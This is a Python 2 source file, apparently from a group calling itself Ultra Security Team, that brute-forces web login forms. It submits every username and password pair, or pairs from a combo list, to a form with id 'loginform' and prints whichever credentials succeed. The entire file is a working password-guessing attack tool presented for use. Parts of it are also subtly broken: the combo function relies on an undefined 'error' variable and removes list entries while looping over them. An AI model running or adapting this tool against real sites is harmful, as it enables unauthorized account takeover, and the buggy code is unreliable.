#!/usr/bin/env python
# -*- coding: UTF-8 -*-

# 	Ultra Security Team

#  Telegram: @ultrasecurity
#  Website : https://ultrasec.org

"""
copyrigth(c) 2018 ultra security team
author: siruidops
:D 
"""

import sys
from color import *
import mechanize
import os

def run(url,usersfield,passsfield,usernames,passwords,error,comboAttack=False):
	if comboAttack:
		combo(usernames,passwords,usersfield,passsfield,url)
		sys.exit()
	else:
		pass
	print 
	print green+" [*] URL: %s %s"%(url,end)
	print yellow+" [+] Status attack ..."+end
	users = usernames.split('\n')
	passs = passwords.split('\n')
	for user in users:
		user = user.strip()
		for passwd in passs:
			passwd = passwd.strip()
			br = mechanize.Browser()
			br.set_handle_robots(False)
			br.addheaders = [("User-agent", 'Firefox')]
			br.open(url)
			br.select_form(id="loginform")
			br[usersfield] = user
			br[passsfield] = passwd
			res = br.submit()
			if error in res.read():
				print red+" [-] Invalid [%s%s%s , %s%s%s]%s"%(green,user,red,green,passwd,red,end)
			else:
				print 
				print green+" [*] Success [%s%s%s , %s%s%s]%s"%(yellow,user,green,yellow,passwd,green,end)
				print
				raw_input()
				sys.exit(red+'Bye :D ...'+end)

def combo(usernames,passwords,usersfield,passsfield,url):
	print
	print green+" [*] Combo List Loaded !"+end
	print yellow+" [*] Status attack ..."+end
	emails = usernames.split('\n')
	passwds = passwords.split('\n')
	for user in emails:
		passwd = passwds[emails.index(user)]
		emails.remove(user)
		passwds.remove(passwd)
		user = user.strip()
		passwd = passwd.strip()
		br = mechanize.Browser()
		br.set_handle_robots(False)
		br.addheaders = [("User-agent", 'Firefox')]
		br.open(url)
		br.select_form(id="loginform")
		br[usersfield] = user
		br[passsfield] = passwd
		res = br.submit()
		if error in res.read():
			print red+" [-] Invalid [%s%s%s , %s%s%s]%s"%(green,user,red,green,passwd,red,end)
		else:
			print 
			print green+" [*] Success [%s%s%s , %s%s%s]%s"%(yellow,user,green,yellow,passwd,green,end)
			print
			try:
				raw_input(tur+"Please enter to continue ..."+end)
			except KeyboardInterrupt:
				sys.exit(red+" Bye :D ..."+end)